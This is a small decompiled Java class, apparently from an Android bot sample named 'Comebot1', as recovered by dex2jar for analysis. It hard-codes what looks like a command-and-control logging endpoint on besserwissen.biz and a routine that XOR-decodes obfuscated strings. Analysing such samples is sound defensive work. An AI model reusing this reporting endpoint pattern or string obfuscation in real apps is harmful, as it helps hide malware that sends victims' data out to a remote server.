package anu_bispro.app;

public class d {
  public final String a = "http://besserwissen.biz/private/add_log.php";
  
  public final int b = 12000;
  
  public final int c = 14000;
  
  public final String d = "1.6";
  
  public final String e = "http://besserwissen.biz";
  
  public final String f = "qwe";
  
  public static String a(String paramString) {
    int i = paramString.length();
    char[] arrayOfChar = new char[i];
    int j = i - 1;
    i = j;
    while (j >= 0) {
      j = paramString.charAt(i);
      int k = i - 1;
      arrayOfChar[i] = (char)(char)(j ^ 0x26);
      if (k >= 0) {
        j = k - 1;
        arrayOfChar[k] = (char)(char)(paramString.charAt(k) ^ 0x70);
        i = j;
      } 
    } 
    return new String(arrayOfChar);
  }
}


/* Location:              /home/fahim/Desktop/Comebot1-dex2jar.jar!/anu_bispro/app/d.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */